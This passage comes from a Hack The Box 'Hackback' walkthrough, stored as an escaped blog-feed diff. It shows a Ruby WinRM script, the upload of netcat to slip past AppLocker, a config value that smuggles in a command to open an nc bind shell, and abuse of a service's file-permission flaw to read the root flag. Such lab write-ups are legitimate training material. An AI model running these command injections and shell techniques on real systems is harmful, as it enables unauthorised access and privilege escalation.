+            &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;echo `nOK`n&quot;&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;start_with?&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DOWNLOAD'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;download_command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;tokenize&lt;/span&gt;
+            &lt;span class=&quot;nb&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Downloading &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;download_command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot; to &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;download_command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;file_manager&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;download&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;download_command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;download_command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bytes_copied&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;total_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+                &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bytes_copied&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; bytes of &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;total_bytes&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; bytes copied&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;echo `nOK`n&quot;&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+
+        &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+            &lt;span class=&quot;no&quot;&gt;STDOUT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;no&quot;&gt;STDERR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;    
+    &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Exiting with code &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;exitcode&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;then-i-uploaded-ncexe-to-cwindowssystem32spooldriverscolor-to-bypass-applocker-&quot;&gt;Then I uploaded &lt;code class=&quot;highlighter-rouge&quot;&gt;nc.exe&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\windows\system32\spool\drivers\color\&lt;/code&gt; (to bypass applocker) :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/hackback# proxychains ./winrm2.rb 
+ProxyChains-3.1 (http://proxychains.sf.net)
+|S-chain|-&amp;lt;&amp;gt;-127.0.0.1:8888-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-10.10.10.128:5985-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
+PS hackback\simple@HACKBACK Documents&amp;gt; UPLOAD /root/Desktop/HTB/boxes/hackback/nc.exe C:\windows\system32\spool\drivers\color\nc.exe
+Uploading /root/Desktop/HTB/boxes/hackback/nc.exe to C:\windows\system32\spool\drivers\color\nc.exe|S-chain|-&amp;lt;&amp;gt;-127.0.0.1:8888-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-10.10.10.128:5985-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
+|S-chain|-&amp;lt;&amp;gt;-127.0.0.1:8888-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-10.10.10.128:5985-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
+26892 bytes of 51488 bytes copied
+51488 bytes of 51488 bytes copied
+
+OK
+PS hackback\simple@HACKBACK Documents&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;after-that-i-used-simple-echo-commands-to-edit-cleanini-it-should-look-like-this-&quot;&gt;After that I used simple echo commands to edit &lt;code class=&quot;highlighter-rouge&quot;&gt;clean.ini&lt;/code&gt;. It should look like this :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[Main]
+LifeTime=100
+LogFile=c:\util\scripts\log.txt &amp;amp; cmd.exe /c C:\windows\system32\spool\drivers\color\nc.exe -lvp 1338 -e cmd.exe
+Directory=c:\inetpub\logs\logfiles
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;this-way-we-can-get-a-bind-shell&quot;&gt;This way we can get a bind shell.&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:\util\scripts&amp;gt; echo [Main] &amp;gt; C:\util\scripts\clean.ini
+echo [Main] &amp;gt; C:\util\scripts\clean.ini
+PS C:\util\scripts&amp;gt; echo LifeTime=100 &amp;gt;&amp;gt; C:\util\scripts\clean.ini
+echo LifeTime=100 &amp;gt;&amp;gt; C:\util\scripts\clean.ini
+PS C:\util\scripts&amp;gt; echo &quot;LogFile=c:\util\scripts\log.txt &amp;amp; cmd.exe /c C:\windows\system32\spool\drivers\color\nc.exe -lvp 1338 -e cmd.exe&quot; &amp;gt;&amp;gt; C:\util\scripts\clean.ini                                          
+echo &quot;LogFile=c:\util\scripts\log.txt &amp;amp; cmd.exe /c C:\windows\system32\spool\drivers\color\nc.exe -lvp 1338 -e cmd.exe&quot; &amp;gt;&amp;gt; C:\util\scripts\clean.ini                                                              
+PS C:\util\scripts&amp;gt; echo &quot;Directory=c:\inetpub\logs\logfiles&quot; &amp;gt;&amp;gt; C:\util\scripts\clean.ini
+echo &quot;Directory=c:\inetpub\logs\logfiles&quot; &amp;gt;&amp;gt; C:\util\scripts\clean.ini
+PS C:\util\scripts&amp;gt; cat clean.ini
+cat clean.ini
+[Main]
+LifeTime=100
+LogFile=c:\util\scripts\log.txt &amp;amp; cmd.exe /c C:\windows\system32\spool\drivers\color\nc.exe -lvp 1338 -e cmd.exe                       Directory=c:\inetpub\logs\logfiles
+PS C:\util\scripts&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;after-some-time-the-listener-starts-and-we-can-connect-to-port-1338-through-the-proxy-&quot;&gt;After some time the listener starts and we can connect to port 1338 through the proxy :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;finally-we-owned-user-&quot;&gt;Finally we owned user !&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;userlogger-filesystem-access-as-system-root-flag&quot;&gt;UserLogger, Filesystem Access as System, Root Flag&lt;/h3&gt;
+&lt;h4 id=&quot;after-getting-a-shell-as-hacker-i-did-my-regular-windows-enumeration-one-thing-i-wanted-to-check-was-the-services-i-remembered-the-services-list-i-got-from-port-6666-so-i-checked-that&quot;&gt;After getting a shell as &lt;code class=&quot;highlighter-rouge&quot;&gt;hacker&lt;/code&gt; I did my regular Windows enumeration, one thing I wanted to check was the services, I remembered the services list I got from port 6666 so I checked that.&lt;/h4&gt;
+&lt;h4 id=&quot;i-noticed--a-strange-service-called-userlogger-&quot;&gt;I noticed  a strange service called &lt;code class=&quot;highlighter-rouge&quot;&gt;UserLogger&lt;/code&gt; :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;        &quot;name&quot;:  &quot;UserLogger&quot;,
+        &quot;startname&quot;:  &quot;LocalSystem&quot;,
+        &quot;displayname&quot;:  &quot;User Logger&quot;,
+        &quot;status&quot;:  &quot;OK&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;so-i-checked-the-entry-of-that-service-in-registry-&quot;&gt;So I checked the entry of that service in registry :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\&amp;gt;reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UserLogger
+reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UserLogger
+
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UserLogger
+    Type    REG_DWORD    0x10
+    Start    REG_DWORD    0x3
+    ErrorControl    REG_DWORD    0x1
+    ImagePath    REG_EXPAND_SZ    c:\windows\system32\UserLogger.exe
+    ObjectName    REG_SZ    LocalSystem
+    DisplayName    REG_SZ    User Logger
+    Description    REG_SZ    This service is responsible for logging user activity
+
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UserLogger\Security
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;description-says-its-responsible-for-logging-user-activity-i-tried-to-start-that-service-as-hacker-&quot;&gt;Description says it’s responsible for logging user activity. I tried to start that service as &lt;code class=&quot;highlighter-rouge&quot;&gt;hacker&lt;/code&gt; :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\Windows\system32&amp;gt;sc start userlogger
+sc start userlogger
+
+SERVICE_NAME: userlogger
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 2  START_PENDING
+                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x7d0
+        PID                : 1368   
+        FLAGS              :
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;hacker-was-allowed-to-start-and-stop-the-service-i-started-to-look-more-into-the-service-and-test-it-i-created-a-test-file-and-called-it-testtxt-then-i-started-the-service-and-gave-it-the-file-as-a-parameter--sc-start-userlogger-testtxt-it-created-a-new-file-called-testtxtlog-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;hacker&lt;/code&gt; was allowed to start and stop the service. I started to look more into the service and test it. I created a test file and called it &lt;code class=&quot;highlighter-rouge&quot;&gt;test.txt&lt;/code&gt; then I started the service and gave it the file as a parameter : &lt;code class=&quot;highlighter-rouge&quot;&gt;sc start userlogger test.txt&lt;/code&gt;. It created a new file called &lt;code class=&quot;highlighter-rouge&quot;&gt;test.txt.log&lt;/code&gt; :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\Users\hacker\Documents&amp;gt;type test.txt.log
+type test.txt.log
+
+Logfile specified!
+Service is starting
+Service is running
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;nothing-interesting-however-when-i-checked-the-permissions-of-that-file-&quot;&gt;Nothing interesting, however when I checked the permissions of that file :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\Users\hacker\Documents&amp;gt;cacls C:\Users\hacker\Documents\test.txt.log
+cacls C:\Users\hacker\Documents\test.txt.log
+
+C:\Users\hacker\Documents\test.txt.log Everyone: F
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;its-readable-by-everyone-this-means-we-can-use-this-service-to-read-anything-we-dont-have-access-to-but-how-will-we-do-that--it-adds-log-after-the-file-name-&quot;&gt;It’s readable by everyone. This means we can use this service to read anything we don’t have access to, but how will we do that ? it adds &lt;code class=&quot;highlighter-rouge&quot;&gt;.log&lt;/code&gt; after the file name ..&lt;/h4&gt;
+&lt;h4 id=&quot;since-windows-doesnt-accept--in-filenames-we-can-try-to-read-roottxt-like-this--sc-start-userlogger-cusersadministratordesktoproottxt&quot;&gt;Since windows doesn’t accept &lt;code class=&quot;highlighter-rouge&quot;&gt;:&lt;/code&gt; in filenames we can try to read &lt;code class=&quot;highlighter-rouge&quot;&gt;root.txt&lt;/code&gt; like this : &lt;code class=&quot;highlighter-rouge&quot;&gt;sc start userlogger C:\users\administrator\desktop\root.txt:&lt;/code&gt;&lt;/h4&gt;
+&lt;h4 id=&quot;when-it-tries-to-add-log-everything-after--will-be-removed-and-the-new-permissions-will-be-applied-to-roottxt-&quot;&gt;When it tries to add &lt;code class=&quot;highlighter-rouge&quot;&gt;.log&lt;/code&gt; everything after &lt;code class=&quot;highlighter-rouge&quot;&gt;:&lt;/code&gt; will be removed and the new permissions will be applied to &lt;code class=&quot;highlighter-rouge&quot;&gt;root.txt&lt;/code&gt; :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:\&amp;gt; cmd /c &quot;sc start userlogger 'c:\users\administrator\desktop\root.txt:'&quot;
+cmd /c &quot;sc start userlogger 'c:\users\administrator\desktop\root.txt:'&quot;
+
+SERVICE_NAME: userlogger
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 2  START_PENDING
+                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x7d0
+        PID                : 1368  
+        FLAGS              : 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;it-worked-and-we-are-able-to-read-roottxt-but-what-is-this--a-troll-&quot;&gt;It worked and we are able to read &lt;code class=&quot;highlighter-rouge&quot;&gt;root.txt&lt;/code&gt;. But what is this ? A troll ?&lt;/h4&gt;
+&lt;h4 id=&quot;just-like-bighead-i-suspected-that-it-had-an-alternate-data-stream-but-without-using-streamsexe-i-tried-some-stuff-and-one-of-my-guesses-worked-&quot;&gt;Just like bighead I suspected that it had an alternate data stream, but without using &lt;code class=&quot;highlighter-rouge&quot;&gt;streams.exe&lt;/code&gt; I tried some stuff and one of my guesses worked :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cat c:\users\administrator\desktop\root.txt:flag.txt&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/hackback/31.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
+&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
+&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
+&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---netmon&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/netmon/&quot;&gt;Hack The Box - Netmon&lt;/a&gt;&lt;/h4&gt;
+&lt;hr /&gt;</content><author><name></name></author><category term="Windows" /><category term="Windows Exploitation" /><category term="Web" /><category term="RCE" /><category term="php" /><category term="pivoting" /><summary type="html">Quick Summary Hey guys today Hackback retired and here’s my write-up about it. Hackback was a very hard machine full of different steps and rabbit holes. It’s a Windows machine and its ip is 10.10.10.128, I added it to /etc/hosts as hackback.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC hackback.htb We got two http ports, 80 and 6666, I also ran a full scan but we’ll get to that later. HTTP I checked both ports, on 80 there was this donkey image : I ran gobuster and it got nothing. I couldn’t send a request to port 6666 from the browser so I used curl : root@kali:~/Desktop/HTB/boxes/hackback# curl http://hackback.htb:6666/ &quot;Missing Command!&quot; It says &quot;Missing Command!&quot; So I tried /help : root@kali:~/Desktop/HTB/boxes/hackback# curl http://hackback.htb:6666/help &quot;hello,proc,whoami,list,info,services,netsat,ipconfig&quot; It returned a list of what commands we can use. /whoami lists information about the user running this service, not really important. /list lists the files in the current directory : root@kali:~/Desktop/HTB/boxes/hackback# curl http://hackback.htb:6666/list [ { &quot;Name&quot;: &quot;aspnet_client&quot;, &quot;length&quot;: null }, { &quot;Name&quot;: &quot;default&quot;, &quot;length&quot;: null }, { &quot;Name&quot;: &quot;new_phish&quot;, &quot;length&quot;: null }, { &quot;Name&quot;: &quot;http.ps1&quot;, &quot;Length&quot;: 1867 }, { &quot;Name&quot;: &quot;iisstart.htm&quot;, &quot;Length&quot;: 703 }, { &quot;Name&quot;: &quot;iisstart.png&quot;, &quot;Length&quot;: 99710 } ] /info prints system information, we might need that : root@kali:~/Desktop/HTB/boxes/hackback# curl http://hackback.htb:6666/info { &quot;WindowsBuildLabEx&quot;: &quot;17763.1.amd64fre.rs5_release.180914-1434&quot;, &quot;WindowsCurrentVersion&quot;: &quot;6.3&quot;, &quot;WindowsEditionId&quot;: &quot;ServerStandard&quot;, &quot;WindowsInstallationType&quot;: &quot;Server&quot;, &quot;WindowsInstallDateFromRegistry&quot;: &quot;\/Date(1542436874000)\/&quot;, &quot;WindowsProductId&quot;: &quot;00429-00520-27817-AA520&quot;, &quot;WindowsProductName&quot;: &quot;Windows Server 2019 Standard&quot;, &quot;WindowsRegisteredOrganization&quot;: &quot;&quot;, &quot;WindowsRegisteredOwner&quot;: &quot;Windows User&quot;, &quot;WindowsSystemRoot&quot;: &quot;C:\\Windows&quot;, &quot;WindowsVersion&quot;: &quot;1809&quot;, &quot;BiosCharacteristics&quot;: null, &quot;BiosBIOSVersion&quot;: null, &quot;BiosBuildNumber&quot;: null, &quot;BiosCaption&quot;: null, &quot;BiosCodeSet&quot;: null, &quot;BiosCurrentLanguage&quot;: null, &quot;BiosDescription&quot;: null, &quot;BiosEmbeddedControllerMajorVersion&quot;: null, &quot;BiosEmbeddedControllerMinorVersion&quot;: null, &quot;BiosFirmwareType&quot;: null, &quot;BiosIdentificationCode&quot;: null, &quot;BiosInstallableLanguages&quot;: null, &quot;BiosInstallDate&quot;: null, &quot;BiosLanguageEdition&quot;: null, &quot;BiosListOfLanguages&quot;: null, &quot;BiosManufacturer&quot;: null, &quot;BiosName&quot;: null, &quot;BiosOtherTargetOS&quot;: null, &quot;BiosPrimaryBIOS&quot;: null, &quot;BiosReleaseDate&quot;: null, &quot;BiosSeralNumber&quot;: null, &quot;BiosSMBIOSBIOSVersion&quot;: null, &quot;BiosSMBIOSMajorVersion&quot;: null, &quot;BiosSMBIOSMinorVersion&quot;: null, &quot;BiosSMBIOSPresent&quot;: null, &quot;BiosSoftwareElementState&quot;: null, &quot;BiosStatus&quot;: null, &quot;BiosSystemBiosMajorVersion&quot;: null, &quot;BiosSystemBiosMinorVersion&quot;: null, &quot;BiosTargetOperatingSystem&quot;: null, &quot;BiosVersion&quot;: null, &quot;CsAdminPasswordStatus&quot;: null, &quot;CsAutomaticManagedPagefile&quot;: null, &quot;CsAutomaticResetBootOption&quot;: null, &quot;CsAutomaticResetCapability&quot;: null, &quot;CsBootOptionOnLimit&quot;: null, &quot;CsBootOptionOnWatchDog&quot;: null, &quot;CsBootROMSupported&quot;: null, &quot;CsBootStatus&quot;: null, &quot;CsBootupState&quot;: null, &quot;CsCaption&quot;: null, &quot;CsChassisBootupState&quot;: null, &quot;CsChassisSKUNumber&quot;: null, &quot;CsCurrentTimeZone&quot;: null, &quot;CsDaylightInEffect&quot;: null, &quot;CsDescription&quot;: null, &quot;CsDNSHostName&quot;: null, &quot;CsDomain&quot;: null, &quot;CsDomainRole&quot;: null, &quot;CsEnableDaylightSavingsTime&quot;: null, &quot;CsFrontPanelResetStatus&quot;: null, &quot;CsHypervisorPresent&quot;: null, &quot;CsInfraredSupported&quot;: null, &quot;CsInitialLoadInfo&quot;: null, &quot;CsInstallDate&quot;: null, &quot;CsKeyboardPasswordStatus&quot;: null, &quot;CsLastLoadInfo&quot;: null, &quot;CsManufacturer&quot;: null, &quot;CsModel&quot;: null, &quot;CsName&quot;: null, &quot;CsNetworkAdapters&quot;: null, &quot;CsNetworkServerModeEnabled&quot;: null, &quot;CsNumberOfLogicalProcessors&quot;: null, &quot;CsNumberOfProcessors&quot;: null, &quot;CsProcessors&quot;: null, &quot;CsOEMStringArray&quot;: null, &quot;CsPartOfDomain&quot;: null, &quot;CsPauseAfterReset&quot;: null, &quot;CsPCSystemType&quot;: null, &quot;CsPCSystemTypeEx&quot;: null, &quot;CsPowerManagementCapabilities&quot;: null, &quot;CsPowerManagementSupported&quot;: null, &quot;CsPowerOnPasswordStatus&quot;: null, &quot;CsPowerState&quot;: null, &quot;CsPowerSupplyState&quot;: null, &quot;CsPrimaryOwnerContact&quot;: null, &quot;CsPrimaryOwnerName&quot;: null, &quot;CsResetCapability&quot;: null, &quot;CsResetCount&quot;: null, &quot;CsResetLimit&quot;: null, &quot;CsRoles&quot;: null, &quot;CsStatus&quot;: null, &quot;CsSupportContactDescription&quot;: null, &quot;CsSystemFamily&quot;: null, &quot;CsSystemSKUNumber&quot;: null, &quot;CsSystemType&quot;: null, &quot;CsThermalState&quot;: null, &quot;CsTotalPhysicalMemory&quot;: null, &quot;CsPhyicallyInstalledMemory&quot;: null, &quot;CsUserName&quot;: null, &quot;CsWakeUpType&quot;: null, &quot;CsWorkgroup&quot;: null, &quot;OsName&quot;: null, &quot;OsType&quot;: null, &quot;OsOperatingSystemSKU&quot;: null, &quot;OsVersion&quot;: null, &quot;OsCSDVersion&quot;: null, &quot;OsBuildNumber&quot;: null, &quot;OsHotFixes&quot;: null, &quot;OsBootDevice&quot;: null, &quot;OsSystemDevice&quot;: null, &quot;OsSystemDirectory&quot;: null, &quot;OsSystemDrive&quot;: null, &quot;OsWindowsDirectory&quot;: null, &quot;OsCountryCode&quot;: null, &quot;OsCurrentTimeZone&quot;: null, &quot;OsLocaleID&quot;: null, &quot;OsLocale&quot;: null, &quot;OsLocalDateTime&quot;: null, &quot;OsLastBootUpTime&quot;: null, &quot;OsUptime&quot;: null, &quot;OsBuildType&quot;: null, &quot;OsCodeSet&quot;: null, &quot;OsDataExecutionPreventionAvailable&quot;: null, &quot;OsDataExecutionPrevention32BitApplications&quot;: null, &quot;OsDataExecutionPreventionDrivers&quot;: null, &quot;OsDataExecutionPreventionSupportPolicy&quot;: null, &quot;OsDebug&quot;: null, &quot;OsDistributed&quot;: null, &quot;OsEncryptionLevel&quot;: null, &quot;OsForegroundApplicationBoost&quot;: null, &quot;OsTotalVisibleMemorySize&quot;: null, &quot;OsFreePhysicalMemory&quot;: null, &quot;OsTotalVirtualMemorySize&quot;: null, &quot;OsFreeVirtualMemory&quot;: null, &quot;OsInUseVirtualMemory&quot;: null, &quot;OsTotalSwapSpaceSize&quot;: null, &quot;OsSizeStoredInPagingFiles&quot;: null, &quot;OsFreeSpaceInPagingFiles&quot;: null, &quot;OsPagingFiles&quot;: null, &quot;OsHardwareAbstractionLayer&quot;: null, &quot;OsInstallDate&quot;: null, &quot;OsManufacturer&quot;: null, &quot;OsMaxNumberOfProcesses&quot;: null, &quot;OsMaxProcessMemorySize&quot;: null, &quot;OsMuiLanguages&quot;: null, 